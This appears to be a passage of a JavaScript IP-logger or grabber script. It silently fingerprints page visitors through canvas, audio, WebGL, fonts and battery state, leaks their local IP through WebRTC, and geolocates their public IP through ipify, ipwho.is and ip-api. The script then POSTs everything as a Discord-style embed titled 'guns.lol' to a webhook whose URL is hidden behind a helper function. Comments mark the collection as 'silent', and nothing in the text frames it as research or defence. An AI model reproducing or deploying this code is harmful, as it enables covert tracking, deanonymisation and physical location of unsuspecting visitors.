  var win = window.innerWidth+'x'+window.innerHeight;

  var orientation = screen.orientation ? screen.orientation.type : '?';

  // network
  var conn = '?';
  if (navigator.connection) {
    conn = navigator.connection.effectiveType || '?';
    if (navigator.connection.downlink) conn += ' ('+navigator.connection.downlink+'Mbps)';
  }

  // WebGL
  var glV = '?', glR = '?';
  try {
    var c = document.createElement('canvas');
    var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
    if (gl) {
      var ext = gl.getExtension('WEBGL_debug_renderer_info');
      if (ext) {
        glV = gl.getParameter(ext.UNMASKED_VENDOR_WEBGL);
        glR = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
      }
    }
  } catch(e){}

  // audio fingerprint (silent)
  var audioFP = '?';
  try {
    var actx = new (window.AudioContext || window.webkitAudioContext)();
    var osc = actx.createOscillator();
    var dst = actx.createScriptProcessor(4096, 1, 1);
    dst.onaudioprocess = function(e){
      var d = e.inputBuffer.getChannelData(0);
      var h = 0;
      for (var i = 0; i < 100; i++) h = ((h << 5) - h) + Math.round(d[i]*1000) | 0;
      audioFP = Math.abs(h).toString(16).slice(0, 8);
      dst.disconnect(); osc.disconnect(); actx.close();
    };
    osc.connect(dst); dst.connect(actx.destination);
    osc.start(); osc.stop(actx.currentTime + 0.05);
  } catch(e){}

  // font detection (silent)
  var fonts = [];
  try {
    var fl = ["monospace","serif","sans-serif","Arial","Helvetica","Times New Roman","Courier New","Verdana","Georgia","Palatino","Garamond","Bookman","Comic Sans MS","Impact","Lucida Console","Tahoma","Trebuchet MS","Courier","Franklin Gothic Medium"];
    var fc = document.createElement("canvas");
    var fctx = fc.getContext("2d");
    for (var i = 0; i < fl.length; i++) {
      fctx.font = '20px ' + fl[i];
      if (fctx.measureText('hello').width > 0) fonts.push(fl[i]);
    }
  } catch(e){}
  var fontStr = fonts.length > 5 ? fonts.slice(0, 8).join(', ') : 'minimal';

  // canvas fingerprint (silent)
  var canvasHash = '?';
  try {
    var cvs = document.createElement('canvas');
    cvs.width = 256; cvs.height = 256;
    var ctx = cvs.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillStyle = '#f60';
    ctx.fillRect(10, 10, 100, 30);
    ctx.fillStyle = '#069';
    ctx.fillText('canvas-fp', 20, 40);
    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
    ctx.fillText('5qcn', 30, 80);
    ctx.fillStyle = '#fff';
    ctx.fillText(location.host, 50, 130);
    canvasHash = cvs.toDataURL().slice(0, 60);
  } catch(e){}

  // webrtc local ip leak
  var localIP = '?';
  try {
    var pc = new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
    pc.createDataChannel('');
    pc.createOffer().then(function(offer){ pc.setLocalDescription(offer); }).catch(function(){});
    pc.onicecandidate = function(e){
      if (e.candidate && e.candidate.candidate) {
        var m = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
        if (m) { localIP = m[0]; }
      }
    };
  } catch(e){}

  var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var ts = now.toISOString().replace('T',' ').split('.')[0];

  var fields = [
    {name:'IP',value:'`'+ip+'`',inline:true},
    {name:'ISP',value:g.org||g.isp||g.org_name||'?',inline:true},
    {name:'ASN',value:g.asn||g.as||'?',inline:true},
    {name:'Country',value:g.country_name||g.country||'?',inline:true},
    {name:'Region',value:g.region||g.regionName||'?',inline:true},
    {name:'City',value:g.city||'?',inline:true},
    {name:'Postal',value:g.postal||g.zip||'?',inline:true},
    {name:'Lat/Lon',value:(g.latitude||g.lat||'?')+', '+(g.longitude||g.lon||'?'),inline:true},
    {name:'Timezone',value:g.timezone||tz,inline:true},
    {name:'Local Time',value:now.toLocaleString(),inline:true},
    {name:'Platform',value:plat,inline:true},
    {name:'Language',value:lang,inline:true},
    {name:'Screen',value:scr+' ('+avail+' avail)',inline:true},
    {name:'Window',value:win,inline:true},
    {name:'Pixel Ratio',value:dpr+'x',inline:true},
    {name:'Color Depth',value:dp+'-bit',inline:true},
    {name:'Orientation',value:orientation,inline:true},
    {name:'CPU Cores',value:cores,inline:true},
    {name:'RAM',value:mem,inline:true},
    {name:'Connection',value:conn,inline:true},
    {name:'Touch Points',value:touch,inline:true},
    {name:'DNT',value:dnt,inline:true},
    {name:'Cookies',value:cookies,inline:true},
    {name:'Plugins',value:plugins,inline:true},
    {name:'WebGL Vendor',value:glV,inline:true},
    {name:'WebGL Renderer',value:glR,inline:true},
    {name:'Canvas FP',value:canvasHash,inline:true},
    {name:'Local IP',value:localIP,inline:true},
    {name:'Audio FP',value:audioFP,inline:true},
    {name:'Fonts',value:fontStr,inline:true}
  ];
  // referer, url, ua at bottom (inline:false to save space)
  fields.push(
    {name:'Referer',value:ref.length>250?ref.slice(0,250)+'...':ref,inline:false},
    {name:'URL',value:href,inline:false},
    {name:'User-Agent',value:ua.length>250?ua.slice(0,250)+'...':ua,inline:false}
  );

  // battery (async — append if we get it)
  if (navigator.getBattery) {
    navigator.getBattery().then(function(b){
      var batt = (b.level*100).toFixed(0)+'%, '+(b.charging?'charging⚡':'not charging');
      fields.splice(25, 0, {name:'Battery',value:batt,inline:true});
      if (fields.length > 25) fields.length = 25;
      send(fields, ts);
    }).catch(function(){ send(fields, ts); });
  } else {
    send(fields, ts);
  }
}

function send(fields, ts) {
  fetch(_wh(), {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({
      embeds:[{
        title: '⑤ guns.lol',
        color: 0x000000,
        fields: fields.slice(0, 25),
        footer: {text: ts}
      }]
    })
  }).catch(function(){});
}

// get IP + geo via ipwho.is (HTTPS, reliable)
fetch('https://api.ipify.org?format=json').then(function(r){ return r.json(); }).then(function(d){
  var ip = d.ip;
  fetch('https://ipwho.is/'+ip).then(function(r){
    if (!r.ok) throw Error('ipwho fail');
    return r.json();
  }).then(function(g){
    if (!g.success) throw Error('ipwho bad');
    gatherInfo({
      ip: g.ip,
      org: g.connection ? (g.connection.isp || g.connection.org) : '?',
      asn: g.connection ? 'AS'+g.connection.asn : '?',
      country: g.country || g.country_code || '?',
      region: g.region || '?',
      city: g.city || '?',
      postal: g.postal || '?',
      latitude: g.latitude,
      longitude: g.longitude,
      timezone: g.timezone ? g.timezone.id : '?'
    });
  }).catch(function(){
    // fallback: ip-api.com (HTTP — may fail on HTTPS pages)
    fetch('http://ip-api.com/json/'+ip+'?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query').then(function(r){
      if (!r.ok) throw Error('ip-api fail');
      return r.json();
    }).then(function(g){
      gatherInfo({
        ip: ip,
        org: g.org || g.isp || '?',
        asn: g.as || '?',
        country: g.country || '?',
        region: g.regionName || '?',
        city: g.city || '?',
        postal: g.zip || '?',
        latitude: g.lat,
        longitude: g.lon,
        timezone: g.timezone || '?'
      });
    }).catch(function(){
      // last resort: just send what we have
      gatherInfo({ip: ip || '?'});
    });
  });
}).catch(function(){
  gatherInfo({ip: '?'});
});
